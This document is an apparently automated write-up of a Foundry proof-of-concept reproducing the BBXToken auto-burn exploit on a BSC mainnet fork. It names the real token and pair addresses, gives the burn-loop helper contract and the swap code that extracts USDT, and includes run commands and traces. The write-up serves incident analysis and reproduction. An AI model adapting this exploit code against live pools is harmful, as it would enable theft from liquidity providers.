## Overview & Context

This proof-of-concept (PoC) reproduces the **BBXToken BBX–USDT auto-burn exploit on BSC mainnet**. In the original incident, BBXToken implemented a time-gated auto-burn that always targeted its configured `liquidityPool` (the BBX–USDT PancakeSwap pair). Once the time gate opened, *any* transfer that passed through `_transfer` could trigger a burn of BBX directly from the pool followed by a `sync()`, permanently skewing the pool’s reserves.

An adversary exploited this by repeatedly invoking the burn path to drain BBX from the pool while leaving USDT untouched, then trading BBX against the depleted pool to extract USDT profits. The root-cause analysis identifies:

- Chain: **BSC mainnet (chainid 56)**
- Victim token: **BBXToken** at `0x67Ca347e7B9387af4E81c36cCA4eAF080dcB33E9`
- Profit token: **BEP20 USDT** at `0x55d398326f99059fF775485246999027B3197955`
- Victim pool: **BBX–USDT PancakeSwap pair** at `0x6051428B580f561B627247119EEd4D0483B8D28e`
- Analysis block height: **47626457**

The PoC is implemented as a Foundry test that:

- Forks **BSC mainnet at block 47626457**.
- Binds to the live BBXToken, USDT, and BBX–USDT pair.
- Drives BBXToken’s auto-burn mechanism against its `liquidityPool` via repeated zero-amount transfers.
- Executes a BBX→USDT swap on the skewed pool to realize USDT profit for the attacker.

### How to Run the PoC

1. Export a BSC mainnet RPC URL as `RPC_URL` (for example, a QuickNode BSC endpoint):

   ```bash
   export RPC_URL="https://<your-bsc-endpoint>"
   ```

2. From the Forge project root:

   ```bash
   cd forge_poc
   RPC_URL="$RPC_URL" forge test --via-ir -vvvvv -m testExploit_BBXAutoBurn
   ```

This runs the exploit test **`BBXAutoBurnExploitTest.testExploit_BBXAutoBurn()`** on a BSC mainnet fork with full traces.

---

## PoC Architecture & Key Contracts

The PoC lives in the Foundry project under `forge_poc/test/Exploit.sol` and is built around three main on-chain contracts plus a small helper:

- **`BBXToken`** (`IBBXToken`)
  - Live BBX token contract on BSC.
  - Exposes `liquidityPool()`, `lastBurnTime()`, `lastBurnGapTime()`, `burnRate()`, and standard ERC‑20 methods.
  - Contains the flawed auto-burn logic that burns from `liquidityPool` and calls `sync()` when the time gate is open.
- **`USDT`** (`IERC20`)
  - Canonical BEP20 USDT contract on BSC.
  - Acts as the profit asset in the exploit.
- **`BBX–USDT Pancake Pair`** (`IPancakePair`)
  - The BBX–USDT liquidity pool targeted by BBXToken’s auto-burn.
  - Implements `token0()`, `token1()`, `getReserves()`, and `swap()` with a Uniswap V2 / PancakeSwap-style constant-product AMM.
- **`BBXBurnerHelper`**
  - A local helper contract used by the test to repeatedly trigger BBXToken’s auto-burn path via zero-amount `transfer` calls.

### Helper Contract: Auto-Burn Driver

The helper encapsulates the burn-driving behavior:

```solidity
contract BBXBurnerHelper {
    function runBurns(IBBXToken token, uint256 iterations) external {
        for (uint256 i = 0; i < iterations; i++) {
            token.transfer(address(this), 0);
        }
    }
}
```

**Snippet origin:** PoC helper contract inside the exploit test file.

This function:

- Sends **zero-amount transfers** of BBX from the helper to itself.
- Each call enters BBXToken’s `_transfer`, which—once the time gate is satisfied—burns BBX from `liquidityPool` and calls `sync()` on the BBX–USDT pair.
- By looping `iterations` times, the test can repeatedly shrink the pool’s BBX reserve without touching USDT.

### Exploit Test Contract

The main test contract is **`BBXAutoBurnExploitTest`**, which:

- Declares constants for the live BBXToken, USDT, and BBX–USDT pair addresses.
- Forks BSC at block `47626457` using `vm.createSelectFork(rpcUrl, FORK_BLOCK)`.
- Creates and labels an `attacker` address and deploys the `BBXBurnerHelper`.
- Implements a single exploit test `testExploit_BBXAutoBurn()` that wires all oracles and runs the attack.

---

## Adversary Execution Flow

The PoC models a clean attacker with no dependence on the historical EOA or contracts. The execution flow is broken into three phases: **pre-checks**, **burn loop + funding**, and **swap / profit realization**.

### 1. Environment Setup & Pre-Checks

The `setUp()` function:

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    vm.createSelectFork(rpcUrl, FORK_BLOCK);

    attacker = makeAddr("attacker");
    vm.label(attacker, "Attacker");
    vm.label(address(bbxToken), "BBXToken");
    vm.label(address(usdtToken), "USDT");
    vm.label(address(bbxUsdtPool), "BBX-USDT-Pair");

    vm.startPrank(attacker);
    helper = new BBXBurnerHelper();
    vm.label(address(helper), "BBXBurnerHelper");
    vm.stopPrank();

    uint256 poolUsdtBefore = usdtToken.balanceOf(address(bbxUsdtPool));
    assertGt(poolUsdtBefore, 0, "BBX-USDT pool must have initial USDT liquidity");

    uint256 poolBbxBefore = bbxToken.balanceOf(address(bbxUsdtPool));
    assertGt(poolBbxBefore, 0, "BBX-USDT pool must have initial BBX liquidity");

    assertEq(
        bbxToken.liquidityPool(),
        address(bbxUsdtPool),
        "BBXToken.liquidityPool must be the BBX-USDT pair"
    );
}
```

**Snippet origin:** `BBXAutoBurnExploitTest.setUp()` in the exploit test.

This establishes:

- A **BSC mainnet fork at block 47626457**, matching the root-cause pre-state.
- A fresh `attacker` address and a locally deployed `BBXBurnerHelper`.
- Oracle pre-checks:
  - BBX–USDT pool has **non-zero USDT liquidity**.
  - BBX–USDT pool has **non-zero BBX liquidity**.
  - `bbxToken.liquidityPool()` is exactly the BBX–USDT pair.

### 2. Opening the Burn Gate & Running the Burn Loop

The core exploit sequence lives in `reproducerAttack()`:

```solidity
function reproducerAttack() internal {
    vm.startPrank(attacker);

    uint256 lastBurn = bbxToken.lastBurnTime();
    uint256 gap = bbxToken.lastBurnGapTime();
    if (block.timestamp < lastBurn + gap) {
        vm.warp(lastBurn + gap + 1);
    }

    helper.runBurns(bbxToken, 10);

    uint256 poolBbx = bbxToken.balanceOf(address(bbxUsdtPool));
    uint256 bbxIn = poolBbx / 1_000;
    if (bbxIn == 0) {
        bbxIn = 1e9;
    }
    deal(address(bbxToken), attacker, bbxIn);
    ...
}
```

**Snippet origin:** `BBXAutoBurnExploitTest.reproducerAttack()` in the exploit test.

Key steps:

- **Burn gate handling:** Reads `lastBurnTime()` and `lastBurnGapTime()` from BBXToken and uses `vm.warp` to ensure `block.timestamp >= lastBurnTime + lastBurnGapTime`. This guarantees the auto-burn path in `_transfer` is active, mirroring the on-chain attack window.
- **Burn loop:** Calls `helper.runBurns(bbxToken, 10)`, which:
  - Issues ten zero-amount transfers to BBXToken.
  - Each transfer triggers the auto-burn, **burning BBX from the BBX–USDT pool** and calling `sync()` to update reserves.
- **Attacker funding:** After skewing the pool, the attacker is funded with BBX:
  - The trade size `bbxIn` is derived as a small fraction (`1/1000`) of the pool’s current BBX balance, with a fallback to `1e9` units if the fraction would be zero.
  - `deal` is used to model an attacker that has acquired BBX elsewhere without relying on the historical EOA or traces.

The Forge trace confirms this phase burns BBX from the pool and updates reserves repeatedly:

```text
BBXToken::transfer(BBXBurnerHelper, 0)
  ├─ BBXToken::balanceOf(BBX-USDT-Pair) → [decreasing BBX balances]
  ├─ emit Transfer(from: BBX-USDT-Pair, to: 0x0000...dEaD, value: ...)
  ├─ BBX-USDT-Pair::sync()
  │   ├─ USDT::balanceOf(BBX-USDT-Pair) → [stable USDT balance]
  │   ├─ BBXToken::balanceOf(BBX-USDT-Pair) → [further reduced BBX balance]
  │   └─ emit Sync(reserveUSDT, reserveBBX)
```

**Snippet origin:** Tail of the exploit test trace showing repeated burn-and-sync cycles.

### 3. Swap & Profit Realization

After the pool is skewed and the attacker holds BBX, `reproducerAttack()` performs a direct BBX→USDT swap:

```solidity
address token0 = bbxUsdtPool.token0();
address token1 = bbxUsdtPool.token1();

require(
    token0 == address(bbxToken) || token1 == address(bbxToken),
    "pair must include BBX"
);
require(
    token0 == address(usdtToken) || token1 == address(usdtToken),
    "pair must include USDT"
);

bbxToken.transfer(address(bbxUsdtPool), bbxIn);
(uint112 r0, uint112 r1, ) = bbxUsdtPool.getReserves();
uint256 reserve0 = uint256(r0);
uint256 reserve1 = uint256(r1);

uint256 amount0Out;
uint256 amount1Out;
if (token0 == address(bbxToken)) {
    uint256 amountIn = bbxToken.balanceOf(address(bbxUsdtPool)) - reserve0;
    uint256 amountOut = getAmountOut(amountIn, reserve0, reserve1);
    amount0Out = 0;
    amount1Out = amountOut;
} else {
    uint256 amountIn = bbxToken.balanceOf(address(bbxUsdtPool)) - reserve1;
    uint256 amountOut = getAmountOut(amountIn, reserve1, reserve0);
    amount0Out = amountOut;
    amount1Out = 0;
}

bbxUsdtPool.swap(amount0Out, amount1Out, attacker, new bytes(0));
```

**Snippet origin:** Swap section of `reproducerAttack()` in the exploit test.

Important points:

- The pair’s token composition is **explicitly verified** to be BBX/USDT.
- The attacker transfers BBX directly to the pair as swap input.
- The test reads **live reserves** from the forked BBX–USDT pair and uses the standard Uniswap V2 `getAmountOut` formula (0.3% fee) to compute the USDT output.
- `swap` sends the resulting USDT directly to the `attacker`.

The trace shows a final `USDT::transfer` from the pool to the attacker followed by a `Swap` and `Sync` event, with the attacker’s USDT balance increasing and the pool’s USDT and BBX reserves decreasing.

---

## Oracle Definitions and Checks

The oracles (from `oracle_definition.json`) describe the desired behavior in terms of variables, pre-checks, hard constraints, and soft constraints. The PoC implements all of them.

### Variables

- `attacker`
  - A fresh address created via `makeAddr("attacker")`.
  - Plays the adversary role; never uses the historical attacker EOA.
- `bbxToken`
  - The live BBXToken contract at `0x67Ca...B33E9`.
- `usdtToken`
  - Canonical BEP20 USDT at `0x55d3...7955`.
- `bbxUsdtPool`
  - The BBX–USDT PancakeSwap pair at `0x6051...D28e`, used as BBXToken’s `liquidityPool`.

### Pre-Checks

The oracles require:

1. **Non-zero USDT in the pool.**
   - Implemented as:
     ```solidity
     uint256 poolUsdtBefore = usdtToken.balanceOf(address(bbxUsdtPool));
     assertGt(poolUsdtBefore, 0, "BBX-USDT pool must have initial USDT liquidity");
     ```
2. **Non-zero BBX in the pool.**
   - Implemented as:
     ```solidity
     uint256 poolBbxBefore = bbxToken.balanceOf(address(bbxUsdtPool));
     assertGt(poolBbxBefore, 0, "BBX-USDT pool must have initial BBX liquidity");
     ```
3. **Liquidity pool binding.**
   - Implemented as:
     ```solidity
     assertEq(
         bbxToken.liquidityPool(),
         address(bbxUsdtPool),
         "BBXToken.liquidityPool must be the BBX-USDT pair"
     );
     ```

### Hard Constraints

1. **Profit asset is canonical USDT.**
   - The oracle expects the profit token to be `0x55d3...7955`.
   - Implemented as:
     ```solidity
     assertEq(
         address(usdtToken),
         0x55d398326f99059fF775485246999027B3197955,
         "profit token should be canonical BEP20USDT on BSC"
     );
     ```
2. **Victim pool composition is BBX/USDT.**
   - Implemented as:
     ```solidity
     address token0 = bbxUsdtPool.token0();
     address token1 = bbxUsdtPool.token1();
     assertTrue(
         token0 == address(bbxToken) || token1 == address(bbxToken),
         "pair must include BBX as one token"
     );
     assertTrue(
         token0 == address(usdtToken) || token1 == address(usdtToken),
         "pair must include USDT as the other token"
     );
     ```
3. **LiquidityPool pointer remains bound.**
   - Implemented as:
     ```solidity
     assertEq(
         bbxToken.liquidityPool(),
         address(bbxUsdtPool),
         "auto-burn liquidityPool must remain the BBX-USDT pair during exploit"
     );
     ```

### Soft Constraints

All soft constraints are encoded in `testExploit_BBXAutoBurn()`:

```solidity
uint256 attackerUsdtBefore = usdtToken.balanceOf(attacker);
uint256 poolUsdtBefore = usdtToken.balanceOf(address(bbxUsdtPool));
uint256 poolBbxBefore = bbxToken.balanceOf(address(bbxUsdtPool));

reproducerAttack();

uint256 attackerUsdtAfter = usdtToken.balanceOf(attacker);
uint256 poolUsdtAfter = usdtToken.balanceOf(address(bbxUsdtPool));
uint256 poolBbxAfter = bbxToken.balanceOf(address(bbxUsdtPool));

assertGt(attackerUsdtAfter, attackerUsdtBefore, "attacker must end with strictly more USDT after exploit");
assertLt(poolUsdtAfter, poolUsdtBefore, "BBX-USDT pool must lose USDT during exploit");
assertLt(poolBbxAfter, poolBbxBefore, "BBX-USDT pool must lose BBX due to auto-burn during exploit");
```

**Snippet origin:** `testExploit_BBXAutoBurn()` success criteria in the exploit test.

This matches the oracle definitions:

- **Attacker USDT profit:** Attacker’s USDT balance is strictly higher after the exploit.
- **Victim USDT depletion:** Pool’s USDT balance strictly decreases.
- **Victim BBX depletion:** Pool’s BBX balance strictly decreases due to the auto-burn.

---

## Validation Result and Robustness

The validator re-ran the Forge tests on the updated project with a BSC mainnet fork, capturing a detailed trace:

- Command (conceptual):

  ```bash
  cd forge_poc
  RPC_URL="$RPC_URL" forge test --via-ir -vvvvv
  ```

- All tests passed, including:
  - `BBXAutoBurnExploitTest.testExploit_BBXAutoBurn()`
  - Existing `CounterTest` tests.
- The validator log is stored at:
  - `artifacts/poc/poc_validator/forge-test.log`

The structured validation result `poc_validated_result.json` records:

- `overall_status: "Pass"`
- `poc_correctness_checks.passes_validation_oracles.passed: true`
- All PoC quality checks marked as `true`:
  - Oracle alignment with definition.
  - Human-readable and labeled.
  - No unexplained magic numbers.
  - Mainnet fork with no local mocks for core protocol components.
  - Self-contained attacker (no historical EOA or helper addresses).
  - End-to-end attack process described.
  - Alignment with the documented root cause.

Taken together, the PoC is robust in the sense that:

- It operates on **real on-chain state** for BBXToken, USDT, and the BBX–USDT pair.
- It is **self-contained**, not reusing attacker artifacts from the incident.
- It encodes the incident’s **economic predicate** (profit plus victim depletion) via explicit oracles.

---

## Linking PoC Behavior to Root Cause

The root-cause report identifies a flawed BBXToken auto-burn design:

- `liquidityPool` is a single address that points at the BBX–USDT PancakeSwap pair.
- When the time gate `block.timestamp >= lastBurnTime + lastBurnGapTime` is satisfied:
  - Any transfer (even for amount `0`) can:
    - Compute a burn amount as a fraction of `balanceOf(liquidityPool)`.
    - Burn that amount from the liquidity pool to the dead address.
    - Call `sync()` on the pair, shifting reserves.
- `lastBurnTime` is never updated, meaning **once the gate opens, it stays open**.
- The logic does not restrict which caller or transfer triggers the burn.

The PoC links directly back to this behavior:

- **Time-gate exploitability**
  - `reproducerAttack()` reads `lastBurnTime()` and `lastBurnGapTime()` and warps time forward if necessary, demonstrating that the gate can be trivially opened by any caller with no special privileges.
- **Auto-burn from the liquidity pool**
  - `BBXBurnerHelper.runBurns()` issues zero-amount transfers that cause BBXToken to burn BBX from `liquidityPool` and call `sync()` on the BBX–USDT pair, confirming that:
    - The burn source is the pool itself.
    - Repeated calls can **drain BBX from the pool** while USDT remains.
- **Reserve skew and profitable swap**
  - After the burn loop, the PoC executes a BBX→USDT swap:
    - Reads on-chain reserves via `getReserves()`.
    - Applies the same constant-product pricing as PancakeSwap to determine `amountOut`.
    - Swaps BBX from the attacker into the pool and receives USDT.
  - The post-conditions (attacker richer in USDT, pool poorer in both USDT and BBX) mirror the incident’s balance diffs.

From the **ACT** perspective:

- **A (Adversary-crafted)**:
  - The attacker crafts an execution sequence using a helper contract to drive repeated BBXToken transfers and a final targeted swap.
- **C (Contract / protocol behavior)**:
  - BBXToken’s flawed auto-burn and the BBX–USDT AMM logic deterministically produce reserve skew and profitable pricing.
- **T (Targeted effect)**:
  - The BBX–USDT pool loses both BBX and USDT reserves, and the attacker gains USDT, satisfying the oracles’ economic predicate.

By faithfully recreating this sequence on a BSC mainnet fork and enforcing the specified oracles, the PoC demonstrates a **correct and high-quality reproduction** of the BBX auto-burn exploit and its root cause.

